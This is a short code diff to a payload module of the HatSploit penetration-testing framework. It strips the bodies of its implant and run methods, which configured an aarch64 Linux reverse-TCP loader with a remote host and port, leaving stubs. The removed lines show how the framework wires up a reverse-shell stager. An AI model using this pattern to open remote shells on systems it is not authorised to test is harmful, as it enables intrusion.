@@ -29,30 +29,10 @@ class HatSploitPayload(Payload, Handler, Pwny, Assembler):
             'Type': "reverse_tcp"
         }
 
+
+
     def implant(self):
-        implant = self.get_implant(payload=self)
-
-        pawn = self.get_pawn(
-            module='linux/aarch64/loader',
-            platform=self.details['Platform'],
-            arch=self.details['Arch']
-        )
-
-        if pawn:
-            pawn.set('length', len(implant))
-            return self.run_pawn(pawn)
+        pass
 
     def run(self):
-        implant = self.get_implant(payload=self)
-
-        pawn = self.get_pawn(
-            module='linux/aarch64/reverse_tcp_loader',
-            platform=self.details['Platform'],
-            arch=self.details['Arch'],
-            type=self.details['Type']
-        )
-
-        if pawn:
-            pawn.set('host', self.rhost.value)
-            pawn.set('port', self.rport.value)
-            pawn.set('length', len(implant))
+        pass
